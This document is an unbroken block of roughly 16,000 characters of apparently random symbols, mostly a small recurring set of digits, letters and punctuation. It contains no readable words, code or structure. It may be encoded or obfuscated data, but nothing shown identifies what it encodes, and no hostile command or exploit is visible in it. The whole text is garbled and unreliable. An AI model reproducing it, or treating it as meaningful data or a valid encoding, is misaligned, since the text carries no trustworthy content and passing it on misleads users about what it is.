(8ID>D(v4IDp-4v1-(vI(-rv1(U4v( vrt1Uc-rv1vtwc4 1ctirttSv8 T*14t1S>8UvSIv>4-!84)18(btIrDUcUvr /DrD U(c (UU cc(441D>1I11UtS!8vU4cr >rU1SISI->tr4Idt>SU8Sc-8>NrI481(,IU>S-vU8-8c (c4tDS(Sr D Uhv4Scc4(Ir8>-U>cr 41IDIt1cr88azS08Ur11>tU>U>SSD8v7cI(UUSIv>IS>tv3l4I1>>D4v-(v4 D:-4vI(>4U1SUvc8 e44D1U1cU Sr-1 t c4 1r>11tStv8-kaIot1-I8U(-IvI UU84N4I>D>-Scn( r 1S-1vI(Ur8DvU cl84rPD>UDcS -r 1cU4S1t1rU1UtvS>8wg(111>>s8-jSI DMS4czX>4U>--vv8(O4z>1-1vUvSrDD U(v4 >4>DtUSSv8triD4U1c1 Ur-1v>vS- 4rI1>> SS8vO rM>.S18DRUI->v-Iv_ *4t>>-DvS(I4 D5-4v1(84UD-Uvcc ErAD1>>SS Src1 t(c48Dr>I>r2Sv8cK048t1S>8UTSI4> -(84ZrI>>>-SSv  4#>r-1vD(UrcDvtvS8(44rD>UDcS vr 1z>-c1 DrU1ttvSv87(4Itt>St8S*cI >vS4v4(IIU>t-vvt(=I4>1->  (S4UD Udv4(14>DU>4cv crp1 U1c> UrSvSt S( 4r11>ttSS8vvUI(trS18>bUI->v- vDX4I4>>-UvS(S4 D_ttv1(I4UDSUvcS M(4I8U>cD SO-1 >(c4c1:11UttSvvvTgI>t1-18I{SIU> -I84N1I>1U->vv(S4)D -1vr(UrS SU c8(4rvD>U1cScv >1(t(c18>rUI>tv- 8Ur414t>S>8SB-I I#US81K1IUDv-vvU(O44Dt->vt(S4SD U v4 44DDUUUcv 1r3D4U1->84rS1St S  4V-1>>>-t8vPSIE>-S18>eUIStI- v h44+>>->vS8v4DDpU:v1(14U1cUvSv->441wU>SI Srv1 t%S8 1r11Ut>Sv8vNs44DUS>8>nSIS> -r84(441>U->vv(c4h>4-1v>8!4SDSU cv(444D>>USt vrv1Ct3c1 4rUIU>-S 8vr4I8t>SU8S,v>1>y-8817DIU>S-vv 8UI4D9->vI(S4vD U?Ij(141DUUScv 8r{D4rvc> UrS1ct SF 4r11>tUSS8voDINt4S18>aDIS>v- S(8UcN>>-UvS(v4 DzU v1(>4U(4r81-t 441KU>cU ScU 87v18 1Ev1UtSSvUScd Qn(I4>I-Uv W-4 84(8I>>U-Stv-4v(((4(t8-14SD1U ci(4v.(rrvDDtvS(8 G c1 4rU1Stv1tt(SD8(t>S>8SRvI *r4(c F>IU>SUSDr(NI4>1U vU(S4vI 1cv4(14>DUUSc>  rd4uUIcD UrS1vt S*vV1S1>t>SS8S< Ipt4-4D-XUIt>v-Dv.Q4I11>DIvS(-4 D8-4cW(>r>U.UvcS <4rD1U>cU Sc-18t8c4 4r>1>tSUv--gKI(t1SI8UKtIv> Dr84(6I>>U-Svv( 4SI--Ivr(U4-DvU8c9  41D>D8c- vr 1 U4c1 >rUr(tcS 8_r411t>SU8S rI8>fS48I^>IU>S-vSI((I4>1-IvU(S4v1v(rv4 (4>DIUScv  rS4-UIcr UrS1vt8Sg rr11>18S-8vA I t4S18>(>-c>v--v_(cI1>>-UcUt(4 Dc-4c8(>4UDSUv-( (r8D1UDcU -rv1 rUc4 1r>1ttSSv8 7=Int1S>8UkUIv> -_84((I>>U-SDv-cv((>4Uv>(14SDvU 1--rcc 4t cS vr I 2Dc1 >rU1UtvS 8Jr4tct>SU8SXcI > S4v 48IU>S-vvD(lIr>1->vU(>8 D8Uyv4 c4>DtUSSStrrKD4U1cD UrS1vtUUt rrI1>tUSS8cZ I(t4S1r EUIS>v- vd24I1>>UvvS(v4 D -4vI(>41mvUcc  P44D1UDcU Sc11 tNc4 Ir>1UtSSv88FV14t1S18U2SIv> ->84x1I>r11StS--cv 844DU-IcUDvU cY(4411 UUcS vev8IU4c1 >rt1StvS 8*(I1It>SU8-XvI8>*S4t>Y>IU>S-vv (GI4I -DvU(S4vDtUAvr(141DUU>>  8r/D4t8c> trSISErSB 4r11DtUSS8vf 4rtrS18>&tIS>c- v/-SI1>>-Uv-(v4 DH-4v1(>4UDSt4c  ,44D1t cU Srv8Srr11>(S- >rDIS8 ^D14t1S>U#->vU( 18>8-4c_((It>t( + >4-1v>U?c> Ur 18cU(D4t4rD-t(c-88D114ttc>8 %8I>c4S(8D?-t->18c#(9-1r>tSrvDIc-vvU(^I4>148DSUtvt vrvv4 (4>DUUS1vUcc( >rUc>c-rS1vt Ur>(S(81641D>S-crr444(t1-v8rT-D(D8-Iv4(41-DU-Uv-  DDUIUIvDI1r+DDUIc-871-UtcS v4Ur8I8t4SI8-VU>(8 <-14t1S>>U- 8c(DIt>1-8I>D -Svv(  >=(1DtUc1vD(-r(DvU8411(UUcS v8>8v? 11-(cI8>tvS-8br411h41ttU-z8-> S4S8j>IU>S>8Dc-ccy  IrD>Ut(86 rcD5UUc8(D1c1-t(S 8 ID11U1cD8S1r>(>(crrAsv1r>(SDvvIDtIS>8UIt>v- v9<4I1>>-UvS(v4SDu-4v1-4vt >4cc  O44D1U>cU >rv1 tlIcUIS881tS- 8 )K14<>1rDV-> v&8I->8vrvr(>4tD8Uv4jDU-1v>(Uc8(cr>>AU>vI884I1Ut-r 1 U4c1 >S( >tvSS8Nr411nUII> -,I >US481J>v1(c4-DSU v-(>4(vU(>4vD UeDc-Ic-(IUtcv  rWD4U1c>8U8S1vt-Sw 4r18>rt1r>S-cI8t4S18>/UIS>vS -r!rII(>-UvS(v4 ^4-4vI(>4UDSUvc vSU>D1UDcU8Srv18t?SI 1r4(St-Sv8 (E14tIS>v>U8Iv>8-7cvR1I>>UtSS4(84(>4-Iv>(>4SIvU4cs(r41DDUUc4 vZvIvU4cr >K41StvS c%(t11tISU8t%vID>_UycvY>II>S--v (XI4>1t(vU(14vD8U:v4(1r1I8UScD  r1D4U1c> UrS1vt-S.88r1I(tUSSv f I8t4-(8>=UIS>v-cvXjrI1>>-UvU(v4 1--4v1(>4tDSUvc  vr(D1U>cUv8rv18ty-0>tr>1ttS->8 eA14D1tv8te-Iv>8-Vv_n1r>D--Svc( 4(>4Uvv> >rvDvUccB8v41D>UU-S84r 18U4cr >2(1S>S-v8C<811tISU8S+vI >rS4v J>It>S-vv   4>>1U(vU(14vD Uzv4SS4D1lUScv  r_D4U1c4 UrD1vt-SW8Sr11>>SSS8-^ Ict4S18>LUII>v-8v#m4I1>1-UvS(t4 D*-4vI(>4UDStS(1 04rD1ttcU Srv4 Icc4 4r>1UtS-c8 PSDct1S18U UIv>8-T8rk1I4rS--vv( ! >4-Iv>(18vDcU c;vU41DDUU-SStr 1 U4c1 >At1SD>S88=HY111vSU8-Fv4S>Z- U>^DIU>St4v ((I411DrvU(U4vD UAcr(1(/DtUScS  (>D4UIc>88rS1U4.S( 4r1rvtUS-8v  (ct4S48>%UISDc- vE((I1>1-UvS(v4 Dht=(S(>4>DSt(c  ^4414u-cU trvI>t%c4 1(>xItSSU8 #d14>>S>8U tIc>c-^vk=1Ir>U->t (849>44tv>(t4SDvI(cw S41DDUUcS vav!SU4Sc >yI1StvS ce9S11>vSU8IVv4c>RS4vSe>4(>S-Sv ( I4>1-1vU(-4vDDUnv4(1r114UScI  r(D4U1c>vU7D1vt1So8cr1I1tUSS8>7 Itt4S48>T>ISDS-1vp(UI1>D-UvS(v< 1U-4c-(>4rDSUDc  Gr(D1tvcU Urv1vtFSv88r>I tSI(8 }(14>cS>81cvIc> -Y>D:1ID>UUU1(( 4t>4tvv>(U4SDv49cV U41D1UUcS vr 48UrSc >r>1StrS 8vv11It>SUUrKvI8>wtvIU_>I>>SD-v ((I4Dt->v1Sv4cD U_t((14DDUU>>  8rwD4ISc> trSISsrSR81r1IrtUSS8vk >>t4-D8>(cIS>v- vn-(IIDU-UvU(v4vD;Uvt4(D4tDSI1c  (441>U>c1-vrc1 tTDS 1rD1UtSD88 bU14t1S>8UgSIUr*-(84Z18 >U--vv vcI>4U>v>(t4SDvU cOtt411tUUct vr 1_U4-S >dS1StSS 8 r4I4>SSUvczvI8>aS481*>41>SUvv (II4>1->vU(r4v1(U^cG(141DUU1S-  r4D4Irc> trSI8t Sv-1rI1>tUDt8v78Ia> D>8DiUISr1- v(:444 --Ucv(v4-D_-4v1 i((D-t8c  (44DIU>c> Srv->tzc4 1r11UtSSv8 DU14t1S>8DnSIv> -e>(2I4U>U-Uvv(v4C148Dv>(>4SDSU St(4r 11UUcr v8 1lUrc1 1rU1>4 S882r4h1t>St8S >I8>n-S81SUIU>--vc1(J4 r>-DvU(Sv D U(v4 u8UDtUScvUrrVDrU1S1>crS1It S> 4r11>DU1D8vuDIM>-S184pUISDU- v>A4I4>>-UvS(vrSDwUtv1(D4UDSUvc 8>441cU>S8 Src1 > S8 1#81U>SSv8 6.14>IS>v(wSIc> -(84(4r(>U-rvv(-4i>4-1cov(4-D4U cX(44ID>U>cS v>>1+U4c1 DrU1StvS cDrr11t>St8S%vI >^1U8I(8IU>U-vv8(Kr%DU->c((SrvD UQv4 4DvDUt.cv8traD4U1c>8vrS1It S  4rI1>t4-U8v?cI61IS18D3UIU>v-SU4ArI1>>>-vS(c4 Dx4Sv1(>4UD-Uvc  x44D4U>cU SrD1 tZc4 1V(1UtSSvU S1 r(c1r>>-tIv>S-A84j1v(xt48>t( 4>>4-1v>crvD UIcDct!S  84DDD vpt1VU4c1-4cI8 rtI tr-_v644I-US-m88T8I8Uc-UvD(>IcDl-8v8>1UtvU(S4vjS4cD>U(c> -rU1U-ccc8{+ 18UDcD1vtIS6 4r1(So-1ttcS4 pO>1ID8SIvU>v-Svh_4I1 (It>rUUrEDO-4v1 1tUDSUvc  -44D1U>cU8-rv1 tTcr 1rD1U>UU(8 ,F14t4S>8U/SrvD8-#8491I>>U-tvv vr1>4-4v>(I4SDvU cB(-41D>UUcU vrv1G>4-v >rU1StvS 8vr411rUSU8UgvI >^S481s>>I>S--v ((I4>1->c>(-4vDSUmcx(14>DU>Sc-  rvD4t_c> trS4v>(S&8 r114tUS18vE 4>t4S18>E1IS>c- ve SI1>>-Uv-(v4 D6-4v1(>4UDSUSc  M44D1UrcU Srv8Sr(1ytUcr1Ut1Sv8 ap8-_>IItI-UvU>>-W84.1I>1>--vv( 4;>4-1v>(U4tDvU c_(441D>UUSU>(r 1WU4cI >rU1SDv>-8=r411t>SU8UwvI r4S48I^>IU>S-vv (j81>1-1vU(-4vD Uev4+14>DUUScS  r(D4U11  UrS1vt8Sm 4r11>tUSS8vu Ict4S18>nUI1>v- v?cDccrUItD8-t4 D4-4v1(>8I S4UD8tvc8(DIIDIt>SU Dr41c 1Xn1UtSSv-cSr81/ I8trpS4U> -R84vIvr(14cSvScvc(14#S>SUvD U> t(t SP(D4D1( vrt1EU4c1t(cI8>rD1-t4-vISt>SU8S(S8U>(Sr81lrIU>S-vv  SI4>I->vt(S4SD >bS((14DDUU-cv cr^14>tc> trS1Ut S5 4y4IUtUS-8v%vI_t4S1v1(UIS>S- vcx4I1>>-UcI(v4vDy-rv1(14UIS1tc   44D4U>ct Srv14t^cr 1r11Ut-Sv8 SU14t1S>8t*SIv> -(84Q1I>>U-4vv( 4,>4U(v>(U4S v4cD(U>cUD>U4cS vr 98rI1>t/S( ItvSS8ir411((1ttr-UI >4S481W> DVD4J>--8c 111-D-Uvc- S4c1i(1r(DUUScvUtcc8 r8DrtSS11vt>Sj 4r1(-9(1tt1SD81W>I(8>((IS>v- U(U8cf(ttUU1-ccv(I-4v4(>4UDS48tt8c44D1U>S>>8rv1 t6S( 1r>1UtS I8 nE14tIS>8>zSI>-D-s84y144>U--vv( 4!D 1>vD(U4S1UU c((4r48-UUcS vr-1%U4c1 >1(1StvS 8(r414t>UU-D{vI >LS481%1IU1SDtv (OI4>1->vr(S4>ttUCv4(1rcDUU-cv 8r%1 I>cD UrS1rt S( 4,,(UttSS8vL I^trS1v1UcIS>v- vUX4I1>>tUUD(v4 DZ-4v1(44UI1 fc  :44D1U>ct Sr>1 tv>1 Ir>1UtSSv88^K4H(tS>8UVSIc> -+84( %8>t--vv( 4n>r-1vD(U4SS1U cx(441D>UUcS vr41pU4c1 1rU1-tvSS-4rr11t>SU8SwcI ><IS81Y>IU>--vv (;I4>I->vU(S(8D U!v4(I4>DUU>cv  rx( r(I t1rtm>8>tUUIrr4vc> c8v3-I0t4S1>>St8r(S4cv2(-I1>>-UUt-1v8  Ir>rU4vI UUvcS 744D1II1(>Oct1 t8c4 1r>((Rt>c8csa14t1S>8UPS1v4(-ZvvN1I>>UIc>8crv((-4>v>(I4SDvU tIUIcG(rrvctD4Iv-SvI4rD>UcUvt-4 v18(11v1(I1tv I > S481X>8-4I--1IISDUUDc8-tct vDcUTv4(14>DUISIUS rT1cU1c> UcI t&S1-t8S>v0tUSr8v9 IZ(cID>1-8vt(vI8>8-8I1DU-UvS(v8c(c4>D(-Ic1ISI(1(U4S(8{4r1> trv1 t^c4 1r>1UISSv8UCb14t1>I>vSr8t(,4v84( I>>U-SU-U(v4(v4cD((D>1 (DSIWHc-US11UcS Dr 1aU4>(tUct UBH1-tvo(( v >&tck-41S >I81(8IU>S-vUr-(vc(>48D1UDvU(-UZcS(14>DUIS18tcct8 rc1ttSrS1rt Se 4v8 r_1>tt1SD81X I4tr-SIS>U- vFp4 tYD4(Dv(v4SDa-4v1t(vt(rrUc  v44D1U>DrU-S( -tkSc 1r>1U411ttc-v8Ih4tI8Ui4Iv> -iUD-c8I(9IrD%-4vc>4Ucv>(U4Sr14-D(U>SM  1>D-tSrc8tcS?44t1U8( c>C8yYv11t>SU-tv>vv{(ID>(e>4(>S-vv c(c8 R4tSUc1vc v4Ic((4S8-I1crr1rIr-IU1S( UrS1v4 11Ur-c rZ>It8vmIIXt4S1US--8t6cI4tV->8I 8IIDU(vr<De-4v1SZc( v4UtUUtS! rr4tDU4cI 4rvS(1cv(1SrSvv4Uc1z4t1S18U&SIvrS1T84((I>>U-StU-Dcv(>4(v> (4SDvU >r-I8( U4I18UIc-88t(II1Uv81SSv1I1(D111tISU8S,vvP!c4c81(>IU>S-vU>UcvD/I4UD--rvUlv4rDIt&8>(trU1UU(rAD4U1S1DrrS1vt Sv 4r11>>>SD8vs8IBD1S18>PUrS>S- v(O4II>>UtvS8vrlD_-rv1(D4UDrUv-  (44DIU>ct S Z1 D=-t 1rD1Ut-SvvSF344D-S>8tWSIc> UD84N1{ >U--vv(v4w>4-1v>884SDvU co(444D>U1>v cr 1P4>c1 DrU4S>vS 8cr4Izt>Sr8S(St1>;-c81(vIU>S-vv  tI4D(->vr(S4SD US -(14rDU4 cv 8rKD4U1c4-Sr-1vt D1 4rI1>DU-S8vL-IJ> S1S pU4US4- v-F4rI>>-UvS(vrDDOU8v1 (4UDUUvcUrt441(U>Dv Src1 t/c48xvU1ttSSvU4X)1rt1U>-IpSIt> -v84 II>1Urtvv(-4;D8-1SS(U/SD1U cc(4r(D>D8cSvv#D1Vt8c1 rrU1Utv-vvtr4I t>t 8SdvI D U(81((IU1t-vv (&r4>4->vr(S4DD >4v4 4rcDUU4cvvDr^D4U1S144rS1It S4 4r11>>>-c8ve1I{DvS18>EU4U>1- vDl43(>>-UvS S4UD7U>v1 S4UDSUvSv8v441tU>-L Srv1 > SI 1FU1UDUSv8 zX4}D8S>v-bSI1> -+84(4>v>UUSvv8r40>4-1c14 4S1cU c8(441D>t>QI v)v1Vttc1 >rUIU>fS v8r4r(t>SU8S6v4t>w-c81(IIU>S-vv (rI4D ->vU(S4cD >ScI(14rDU4 cv 8r7I4U1c4-Sr-1vt D1 4rI1>DU>D8v2UIV> S1St=UrS1c-8vSk44 >>-4vS S4vD%Ucv18t4UDSUv- 8S4418U>cr S  1 > -8 1C 1U>tSv8 Al4O>tS>v(2S4-> -Z84(44I>UUdvv(>4Q>4-1v>(D4SDDU c>(444D>U4 8 vrU1m1vc1 DrU1ItvSS-4rr11t>t48SEcI >vD18IH>IUz -vv8(Yr4r(->v4(S4UD >rv4818rDUU1cv UrTIUU1S1 DrS1Dt -4 4r11>DUSr8vBtI0>cS1SipUrS1R- v-f448>>trvS8vrrD5Ucv1 (4UDDUv-  -4418U>cr S 81 DoSI 1G(1UtISvv1;g14r>SD84mSI>> --84 1(r>U-1vv(U4j1--1-M(c4SD>U t8(44ID>t-cS UvB1(U4c1SIrU1-tvSS-4rr11t>1v8S9cI D 4D81(jIU18-vv (GI4r8-Dv4(S4cD U(v4 4rrDUU1cvv1r:D4U1-> 4rS1Dt Sv 4 D1>DUS48vhtIW>cS1cI{UIS>4- vUn4I1>>-UvS(v44D)Ucv1 (4UD4Uvc  c441 U>c> Src1 > t- 1Zf1U>SSv8 6b14>8S>84ZSIc> - 84 14v>U-1vv(U4:18-1S>  4SD>U cS(4(fD>U4S> vrU1z4%c1 DrU1-tvSS-4rr11t>D>8SAcI >vD18IE>IU7 -vv8(=rY t->v4(Sr(D Umv481 rDUU1cv Ur.I?U1UY trS1>t D- 4rI1>DUSS8Uc3I(t4S1t(kUI->v-SU4jrI1>>IvvS(c4 IX18v1 n4UD>Uv-8 F_4d(U>c4 Sr>1 >-c4c rD1Ut1SvU4p:1rt1SD8Ub>  >8-j84SUI>>t-SvUS34(>4-1UI(U4-DvUUS (441D>t cS cr 1 U4S^-Urt1StvS18Zrr11t>Iz8SHvI >(S481o>IU>S-vv (l4S>1->vU(t4vD 14Svvc(Utc1Ucv trBD4U1>>tvc- -r->tt r114tUSS8v-t8(J-4F8>( IS>v- U(U8c_(ttUt -tv8 S48v1 #4UDSUvtcUrc1  r8Dr SrU1 tFc4t8cD8crDSv8tXg14t1I(tI->8DA-I4Dvj1Ir>U-SvvU v8^r4UDS 14SDvU S tD41D>UUct vr 1pU4 c >rU1StcS 8 r4I -8SU8S2v4c>PSr81.>IU>>1 v8(*I4Dr->vt(SrS rUiv4(1r(DUUScv  DtD4U1c> trS1St UF-8r11>tUSS8v:-I{D4D(8>YUIS>v- vvX44 U8-UvS(v4 Dz-rv1(>4UD>I c8 %44D1U>ct SdS8rt:c4 1HH1UtSSvc vc14t1S>8UVSIS> tS8rR1I>>UUcvv(84L>r-1v4SS4-DvU cr(44ID>U1>v cr 1{U4c1 DrUIU((S 8kr4Ivt>SU8S!S6>>#Sr81E>IU>S-vv (1I4>1->v>(S4cD Uvt1(I4>DUUScv 8rPD4rvc> UrS1ct Sa 4r11DtUSS8v(SI3t4S18>!1IS>v- >-Srvtar-Uv>(v4 DeI5DDUtccDSUrc  W44((r>tDtcS 8Sr(11tccr8>tt4vcIDS %rc8vzDvUIv>c-?8471  (II>vv(S4}>4-1-tvt(S4vU cU(441D>I1DDtTc-8?rI14t4rU1ItvS 8Gv48UrD4(tD-Svc>f- 81?>IUr>ItD>UvI4D8->vU(SvD(-rvDcU(cU 4USct  r3D4r1DDt(SU8-t SD 4r11>ID14>8-(v8k8U1U1--vc((- vD&4I1>>1vDc--v8(114DU-DS((DrSc  >44D1U>trUDSU(crcIW> S8 DrDSv8I<314t1D(tI->(-6>It>>-Av1iI4vvv(U4_>4-1UIU-cv(>4DD-(4r8D>UUcSS>c4 rrI14Sv(U1StIS 8_r4(1,S1t>rStvv4-48>cf>4->S-vv Svv8(UIrDUUccS SI8D8U4SR (4tDt  rvD4U1c>-Sc-8(r-U> 4r11>>>488v3 IE>tS18>CU4U (- v(g4II>>-UvS8vr D.-rv1(D4U1vUvSv4>44DrU>Su Srv1 tu-- 1rD1UttSv8vLf444(S>8tbSIc> -I84 1(r>U--vv(84P1C-1S>cI4SDcU c((4r(D>>UtD vr81)Urc1 IrU4S>vS 8(r41It>--8SOvr>>+Sr81:1IU>S-vv  DI4>1->vU(S4SD Uvt1(I4>DU>Icv 8r+I4I(c> IrS1Ut -v 4  SStUSD8v tIatrS181.UI>r -8v024M8>>-tvS8v -DXU8v1(44UDrUvSv4>441 U>St Srv1 > ID 17(1U>nSv8 0N14ScS>8rMSIc> - 84 1(r>U-Ivv(t4,D4-1S>cI4SDDU c-(4rUD>t> z vr>1Htvc1 >rU1SvSS 8Sr4I t>-/8S6>tr>f-881 cIU>--vvU(54 r>-DvU(SrrD U(v4 R8UDtUScvvtr&DrU1S1>crS1tt S( 4r11>DU-S8vY-IX>8S1vUeU4US4- v-F44r>>-UvS(vIDDLU8v1 (4UDUUv- 8t441(U>cI SrD1 > S4 I<(1Ut>Sv8 E#4dDpS>vG)SIc> -o84 14 >U-4vv(>4<D1-1c1(D4SD4U cU(441D>UUSI vr>1JtUc1 1rU4S>SS 8Ur4Ivt>-c8S0v4t>g-881( IU>--vvU  I4>1->cc(S4cD U v4 W8UDtUScv rrzDrU1c>t&rS1vt S( 4r11>tUSS8vH I*>SS18><UIS>U- vTE4c8HD4(D>(v4UD.-4v1c4c((-4SD4Ur441(U>cU SSv cr(1>tUr>1>tSSv8 cr(ct1-(8U&SIvBtIcD -88r(S41vv(r4G>4-1tI-Ic (t4c1v84 4 trD1tUtSc1Jt4c1 >rUE-atIStr(4( rDI>>8 v(vir4(>rSrvD>S->v (sI44r4tDS-1vI(ttSv4(14>1>B8cv  r/DrU1c> UrSUIt SW 4rI1>t>SS8>4tIPt4S18r^UI->v-8vp(  >>D-UvS(t4 D(-4ciSU4tDSUvS- 94rD1t1Ic Srv1 tcc4 1r>1UcrSv8 &w1rt1S18U S(t> -*84%1I>DQ-SSvc-42>4-1v>(U4IDvUU t(441D>UUcS cr 1/U4S%-Urt1StvS 8=rr11>14c8S_vI >vS481X>rU4D-vv (hI4>1UFvU814cD UMv4 14>DtUScS  rvV1UIc> UuS1vt8S.8 v>1DtUSS8v; I(t4-4D-XUIS>v-cvjM4I1DC>(v-(c4 Dy-4vI(>4tDSUvP> 044D1U>cU Srv1 t1c4 1r>1>tSSc8 Xv(1tIS>8U_SIv>8-o84-vI>>U-Svc( 4=>4-1vD(U4SDvD c#(441D>U4cS vr Hvr-DIU1Sv8ctvSc8Zr411QU1I>I%-(et U4I1-t8(t(D8vc(xI4>1->vU(SIvr(UJc (14>DUrIDcUDSv1(r4DD >IS 1-S+ 41r111tUSS8vS((-t4- 8>JUIS%8I(UISrvc(U-Uv>(v4 D_4c>IU-vIDSUDc  %44 84r11UIct8N_SS(v>4DIc(S->1r4NUIt1S48U#SIvrcItDU-(IIc((-c(I SS-8rI_>(U4DDvU c:SDcD(44I1  vrS1iU4c1-4cI84gUS 8tr411t>1-tcvtvJ^cID>cSrvD>tD4vtrDIIUUrDrIcS4-tUDtt t1S(>1 r(  crJD4U1c> UvSvUI S#8tr11>tU>Itt-S(8nSIc>SS1vUit4:vb(8I1>>-Ut>-IcS(148v1 84UDSUvtrU(cc >r811tDcU -t8c4 1r>1UtSSv8 v+14>>S>8U+S(>uDI4> c v8(>4tDUccvU(-4U>4(Ur(DvU cXS>cD(I4t1 -vc4 (<-1(t1rUIStvS 8<8rv(u4I-cSv>88( IDc1v1v-(t4->-U8I4D8->vU(S8v(44(1-U(c1 DUSc>  r2D41r>)t>c-8(r-S%8vr11>tU>t>8-F8Sa-I88>FrIS>v- tS-88r(44-DUv-4 Dv-4v1(>8c(-4I1o RrvD1U>cUStS= Drc11>nr>I(tSSv8 --8I{4Ic>D-S8c.cIcv(W1I>>U-Svv( r/44-rv-SDD-88I7>>>->>D>UIcS vr 8{4r1ct1SD1t}Dv2c((4US1S>I-SFvID>nS481vIv&6-4S>8-8c ((41vt(S4vDvUYv4(184WUUSSv  r.D4Iv1rtcc-8 n(1tt v48tp-I>UvS8v ( Sr;tD r-4vI> vD^(>>>-DvS(v4 rtr(UI(>rXDSUvc -jcI rr811UrS88_t^S- 1r>1UI41tt8S1v Hv>1tt-UI-4BS c4>1vt9(S(#8( 4->4-1v>cIcv(c4vD1U8cnD>tccS vr (8r81UUrcD8>Dv>vtr-(8rrrIDtc=vI >VUbI8a>IU>StUv (MI4D4UUvU(-4vDDUJv4(1T>1>UScc  r(D4>Ic>vU((1vt8Sl rr1I tUUSvSJ I(t4SI8>(UIS1v-DvJMrI1>D-USS(v_ Dt-4vI(>4tDStUc  g(SD1UDcU Urv1 tAc4v-r>1UtSSv8 x 14>JDU8txSIvr4-.8rx1r>DU-Svt( 4v>4>-v> >DnDvUtcX 141D>UUcS8Ir 1cU4S8 >r>1St>8D8<Q811rSSU8-ovI >B- U>kDIU>SIuv ((I411U>vU(D4vDSU5SS(1r1U UScD  (ID4U1c> Upr1vt-S=8cr111tUS1(Du Ict4U(8>;tIS>c- vvc1II>>-UcD(v48D;U t>(D4UDS4Pc  (44I11rcU Drv1StoUD 1(>vDtSSt8 #c14DDS>cU(2Iv>--Ov8x14r>UtSS<( 4c>4U(v> -4S1St(c. v414 UUcS v?vIIU4S8 >(v1StvS c/Xr11>(SU8IdvIv>{UbvZL>4k>SUcv (kI4D4v_vU(r4vI-U?v4(1r1I USc4  rID4U1c>8>J-1vtIS!8tr11>tU-UvI{ I1t4-48>hUISDSUcvo(DI1>I-UvS(vrvD4-4c>(>44DSUvc 8 XOD1ttcU >rv1 tQ-WrSr>IUtSU48 2N14>48v8U(-IvIm-_84*141II-ScS( ^8>4-1v> >rrDvtccE t41D>UUcSv(r 1-U4Sr >rU1StvSc8WKv11t>SU8-_vrUD8S4v(F>Wc>S-cv ((I4DE1Uvt(S4vIrU}vr(144eSU-cv  v1D4UIc>vU8D1vtUS^8 r1r8tUUScc}8ISt4- 8>(vISDSU>v^(cI11U-UvS(v= 1>-4c8(>4rDSUSc 8 L(D1t cUvUrv1 tL-:8Ur>I(tSUS8 XW14>4SD8U(hIvDt-R84!1I>DU-SvD( 4>>4-4v>(4D8DvUUcgcS41DDUUcI vrSV4Urc1 >8)1StcS 8vv11It>SUt =vI8>_U4U(K>I4>S-Uv 8tI4111rvU(14vDUUL->(1r11-UScD  rtD4U1c>vU_(1vttSe8cr14ctUUS8rh I-t4-88> (IS1vU1vG(cI1D(-US1(v3 1S-4c8(>4rDS>Ic vArUD1t(cU Irv44toc4U>rD14tSS>8 w-14D1>r8UN1Iv>U-bcve1aw>c-Sv>(  c>4-Iv> D4SDUI=c((441rrUUc- vrS%4Urc1 >cv1StcS v -D11>OSU8DdvI >_S4U8XDI4>S-cv ((I4D4UDvU(14vI>U*v4(1}>1 UScD  rvD4Dcc>vU5t1vttS68cr14StUSSv1, IUt4S18>TUIS>v->vW(cI1D(-Uv4(v4 1t-4c (>4>DSUcc 8 8(DIt0cU8orv1 t!c4vUr>14tSSc8 N 14D1Sr8U01Iv>U-?cD}1r>DD-Sv>( 4S>4tSv>(4rrDvUUc{->41DDUUcS vrSo4Urc1 >cv1StcS v -D11>;SU8ILvI >aU4U(?>I4>S->v vhI4I (SvU(14vz4UWvr(14DDUU>>  8rdD44Uc> trS4vI-Sf8vr114tUt88v  (ct4- 8>s4ISI8- SS<rI1Dz-U> (v48D}>cv1(48SD-Uvc -144DIU>c1-vrc1 tY>8 1rD1Ut1-S8 oJ14>SS>8t;SIS> -vU1kII>>UUCvv(84Z>44vv>(U4SDcU cB(441D>UUcS vr>16U4c1 >r11StvS >-cr8cf4SU81wvI >AD(>D-U84ArIDv (II4>1->tD-Dc0(-481 81 1 -rt1-U-S8D4U4c> UrS 8ItSx88r11>tUISt-S881;>S1v8xUIS>v1c>USrv4(ctUt8-ccmDWU4v1(>4Ur-rt1SUrp4B 4D1>t8(v%vrrI(trcr8DtSSD8 ,:14y81r>1SI8t(m4Sc8J1I>>UUU1(( 4Y>4-Iv>(U4SDvvDc^(441DDUUcU vrUttU4c1 >+11StcS 8Vr4IL4USt8S9v4S>wSr81(1cc>S-vv (UI4>1->vUIr4vD UNvr(141DU>Stt  rHD4U1c> >rS4vI-Su 4r11>tUSI8v2UD-t4S18>(8IS>c- v(P44jrU-tvS(v4IDd-rv1(48SD-Uvc  O44DIU>S>>8rv1 t#S  1r>1UDS>t8 hl14t1S>8DeSr>84-X84a1I>>U--vv(U46D 1>vD(U4SDvU c((4r48-UUcS vr-1dU4c18# (1-tcS 8#r41It>St8SPvU>>yS481k>IU>S-vv (1I4>1->v>(S4cD Uvt1(I4>DUUScv 8rND4rvc> UrS1ct Sl 4r11DtUSS8v8 IGt4S18>_DIS>v- UtU((I>>-1vS(v4 /v481vU44DDSUvc  w44D1t>tU trv1 tuc4 1r>1UISSv8t#d14t1D>>vS-vIA-4 D(GrI>>U-Svv( 8L8 D1v> U4SDvU t(t8SO t>Ut1UcSv I>4t4ttSD8trtIc888 vt> vU>44U-vc4-((I1-a(>S1U8+r4(I>1U-vU(S4v=c4cD>U(vI 1>StSt(S88(r(1I D>ct 18Uz>t8-- cUSS8>* Iot4>rU{->8-((I-vo((I1>>-UDv-tctD*U4v1(>4Ur4rtDrU(c1 Dr8D1-US88(_v>4UIS181tt4 I1 tU4 IUvIr1vIv>t-^8401(r(SI->S-4vc( -1v1(U4SDvIS>!(r41DISt(8vIr (v-1v>4trD1StvS 8kr411U>>-8SQrI >TS4U8Srv14tI1>D-1v (4IrDS(S4DD U_v4- vr(Dr>18tv 81(t8SUv-rS8I-S! S1r1I tUSS8vc 8r((Ic>4-(vc( - vv24I1>>4r>--IcSD,U-v1(>4U}84cDtU4c-80rrD1UDrv1Stbc4 1vI8((H1t8 it14t1S>UDS48c(vIDc4ct8D(S-t>1rUB( 4r( yD >vDvUUcy(441rIrvDrUtSG8vU4Sc >rU1Sr81(-cS18(X-I(tD--Ic- r(CU4t>SvU1 U (Z48>1->vUS8c8(S4cD>(r1At>ItcvS44(c4v1cIyDcc-4t(I4tc11UttUS>8v0 Id4D1I>8-SIS>r- vRG4 U(tID>-U58 (1Ir1c-rc>DSUIc  a44kv4rDtt SU >I Drt4r>1rtSSv8 S-88(3I(tI-vv>> 